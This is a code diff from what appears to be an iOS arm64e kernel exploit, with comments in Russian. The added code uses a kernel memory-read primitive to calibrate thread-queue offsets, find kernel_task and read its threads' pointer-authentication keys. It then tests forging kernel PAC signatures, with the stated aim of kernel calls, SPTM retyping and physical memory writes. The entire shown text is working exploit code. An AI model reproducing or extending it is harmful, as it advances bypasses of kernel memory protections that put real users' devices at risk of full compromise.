@@ -5050,6 +5050,53 @@ static void kpPacLive(NSString *line)
     if (signed_ == expected) {
         [r appendString:@"\n=== PAC FORGING VERIFIED: подписываем любые указатели любыми ключами — с kernel_task keys это kcall на arm64e → SPTM retype → physwrite ===\n"];
         kpPacLive(@"\n=== PAC FORGING VERIFIED ===\n");
+
+        // --- kernel keys probe: есть ли у kernel_task тредов PAC-ключи? ---
+        pacnote(@"--- kernel keys probe ---");
+        extern uint64_t task_self(void);
+        uint64_t selfTask = task_self();
+        // self-calibrate (task.threads, thread.task_threads) на своём таске:
+        // ищем пару оффсетов, по которым очередь тредов содержит наш threadVA.
+        const uint32_t qcands[] = {0x58, 0x50, 0x60};
+        const uint32_t lcands[] = {0x3b0, 0x3d8, 0x3e0, 0x388, 0x380, 0x398};
+        uint32_t taskQ = 0, linkQ = 0;
+        for (int ci = 0; ci < 3 && !taskQ; ci++) {
+            for (int li = 0; li < 6 && !taskQ; li++) {
+                uint64_t head = selfTask + qcands[ci];
+                uint64_t cur = kp_untag_ptr(kp_rc_kread64(head));
+                for (int n = 0; n < 64 && cur && cur != head; n++) {
+                    if (cur - lcands[li] == threadVA) { taskQ = qcands[ci]; linkQ = lcands[li]; break; }
+                    if (!kpLooksLikeKernelPointer(cur)) break;
+                    cur = kp_untag_ptr(kp_rc_kread64(cur));
+                }
+            }
+        }
+        pacnote([NSString stringWithFormat:@"  self-calib: task.threads=0x%x link=0x%x %@", taskQ, linkQ,
+                  taskQ ? @"" : @"— НЕ ПОДОБРАЛИ (стоп)"]);
+        if (taskQ) {
+            uint64_t ktProc = [self findProcByCommName:"kernel_task" log:r];
+            if (ktProc) {
+                uint64_t p_proc_ro = kp_untag_ptr(kp_rc_kread64(ktProc + off_proc_p_proc_ro));
+                uint64_t ktTask = kp_untag_ptr(kp_rc_kread64(p_proc_ro + off_proc_ro_pr_task));
+                pacnote([NSString stringWithFormat:@"  kernel_task task @ %#llx", ktTask]);
+                uint64_t head = ktTask + taskQ;
+                uint64_t cur = kp_untag_ptr(kp_rc_kread64(head));
+                uint64_t ktThread = (cur && cur != head && kpLooksLikeKernelPointer(cur)) ? cur - linkQ : 0;
+                pacnote([NSString stringWithFormat:@"  первый kernel thread_t @ %#llx", ktThread]);
+                if (ktThread) {
+                    uint64_t ka = kp_rc_kread64(ktThread + 0x1B0);
+                    uint64_t kb = kp_rc_kread64(ktThread + 0x1B8);
+                    pacnote([NSString stringWithFormat:@"  kernel thread keys: a=%#llx b=%#llx %@", ka, kb,
+                              (ka || kb) ? @"" : @"— НУЛИ: у kernel-тредов нет user-ключей, kernel-signing через thread_t закрыт"]);
+                    if (ka || kb) {
+                        uint64_t ksig = kp_remotepac(ktThread, address, modifier);
+                        pacnote([NSString stringWithFormat:@"  kernel remotepac → %#llx %@", (unsigned long long)ksig,
+                                  ksig != expected ? @"— ОТЛИЧАЕТСЯ от userland: kernel PAC forging РАБОТАЕТ!"
+                                                   : @"— совпала с userland (ключи те же?)"]);
+                    }
+                }
+            }
+        }
     }
     return r;
 }
